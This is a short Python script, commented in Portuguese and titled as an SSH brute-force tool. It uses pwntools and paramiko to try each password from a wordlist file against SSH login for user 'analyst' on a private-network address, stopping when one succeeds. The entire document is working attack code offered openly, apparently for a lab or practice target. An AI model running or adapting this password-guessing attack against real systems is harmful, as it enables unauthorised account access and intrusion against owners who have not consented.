#SSh brute Force

import paramiko.ssh_exception
from pwn import *
import paramiko

alvo ="192.168.255.170"
username = "analyst"
attempts = 0

with open("passes.txt", "r") as password_list:
    for password in password_list:
        print(password.strip("\n"))
        password=password.strip("\n")
        
        try:
            print("[{}] a tentar a password: {}".format(attempts, password))
            resposta=ssh(host=alvo,user=username, password=password,timeout=1 )
            if resposta.connected():
                print("Password valida: {}".format(password))
                resposta.close()
                break
            resposta.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Password invalida")
            
        attempts+=1